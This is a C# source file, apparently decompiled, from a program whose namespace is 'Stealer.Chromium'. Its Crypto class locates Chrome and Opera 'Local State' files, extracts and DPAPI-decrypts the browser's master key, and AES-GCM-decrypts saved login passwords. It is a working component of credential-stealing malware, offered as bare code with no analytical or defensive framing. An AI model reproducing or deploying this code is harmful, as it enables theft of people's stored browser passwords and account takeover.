﻿using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Stealer.Chromium
{
	// Token: 0x02000040 RID: 64
	internal sealed class Crypto
	{
		// Token: 0x060000EE RID: 238
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Crypto.DataBlob pCipherText, ref string pszDescription, ref Crypto.DataBlob pEntropy, IntPtr pReserved, ref Crypto.CryptprotectPromptstruct pPrompt, int dwFlags, ref Crypto.DataBlob pPlainText);

		// Token: 0x060000EF RID: 239 RVA: 0x00007C28 File Offset: 0x00005E28
		public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
		{
			Crypto.DataBlob dataBlob = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob2 = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob3 = default(Crypto.DataBlob);
			Crypto.CryptprotectPromptstruct cryptprotectPromptstruct = new Crypto.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Crypto.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (bCipher == null)
					{
						bCipher = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(bCipher.Length);
					dataBlob2.cbData = bCipher.Length;
					Marshal.Copy(bCipher, 0, dataBlob2.pbData, bCipher.Length);
				}
				catch
				{
				}
				try
				{
					if (bEntropy == null)
					{
						bEntropy = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(bEntropy.Length);
					dataBlob3.cbData = bEntropy.Length;
					Marshal.Copy(bEntropy, 0, dataBlob3.pbData, bEntropy.Length);
				}
				catch
				{
				}
				Crypto.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x00007DDC File Offset: 0x00005FDC
		public static byte[] GetMasterKey(string sLocalStateFolder)
		{
			string text;
			if (sLocalStateFolder.Contains("Opera"))
			{
				text = sLocalStateFolder + "\\Opera Stable\\Local State";
			}
			else
			{
				text = sLocalStateFolder + "\\Local State";
			}
			byte[] array = new byte[0];
			if (!File.Exists(text))
			{
				return null;
			}
			if (text != Crypto.sPrevBrowserPath)
			{
				Crypto.sPrevBrowserPath = text;
				foreach (object obj in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text)))
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						array = Convert.FromBase64String(match.Groups[1].Value);
					}
				}
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				byte[] result;
				try
				{
					Crypto.sPrevMasterKey = Crypto.DPAPIDecrypt(array2, null);
					result = Crypto.sPrevMasterKey;
				}
				catch
				{
					result = null;
				}
				return result;
			}
			return Crypto.sPrevMasterKey;
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x00007EFC File Offset: 0x000060FC
		public static string GetUTF8(string sNonUtf8)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = sNonUtf8;
			}
			return result;
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x00007F3C File Offset: 0x0000613C
		public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
		{
			byte[] array = new byte[12];
			Array.Copy(bEncryptedData, 3, array, 0, 12);
			byte[] result;
			try
			{
				byte[] array2 = new byte[bEncryptedData.Length - 15];
				Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
				byte[] array3 = new byte[16];
				byte[] array4 = new byte[array2.Length - array3.Length];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				result = new cAesGcm().Decrypt(bMasterKey, array, null, array4, array3);
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = null;
			}
			return result;
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x00007FDC File Offset: 0x000061DC
		public static string EasyDecrypt(string sLoginData, string sPassword)
		{
			if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
			{
				byte[] masterKey = Crypto.GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
				return Encoding.Default.GetString(Crypto.DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
			}
			return Encoding.Default.GetString(Crypto.DPAPIDecrypt(Encoding.Default.GetBytes(sPassword), null));
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x00008050 File Offset: 0x00006250
		public static string BrowserPathToAppName(string sLoginData)
		{
			if (sLoginData.Contains("Opera"))
			{
				return "Opera";
			}
			sLoginData.Replace(Paths.lappdata, "");
			return sLoginData.Split(new char[]
			{
				'\\'
			})[1];
		}

		// Token: 0x040000AB RID: 171
		private static string sPrevBrowserPath = "";

		// Token: 0x040000AC RID: 172
		private static byte[] sPrevMasterKey = new byte[0];

		// Token: 0x02000041 RID: 65
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x040000AD RID: 173
			public int cbSize;

			// Token: 0x040000AE RID: 174
			public int dwPromptFlags;

			// Token: 0x040000AF RID: 175
			public IntPtr hwndApp;

			// Token: 0x040000B0 RID: 176
			public string szPrompt;
		}

		// Token: 0x02000042 RID: 66
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x040000B1 RID: 177
			public int cbData;

			// Token: 0x040000B2 RID: 178
			public IntPtr pbData;
		}
	}
}
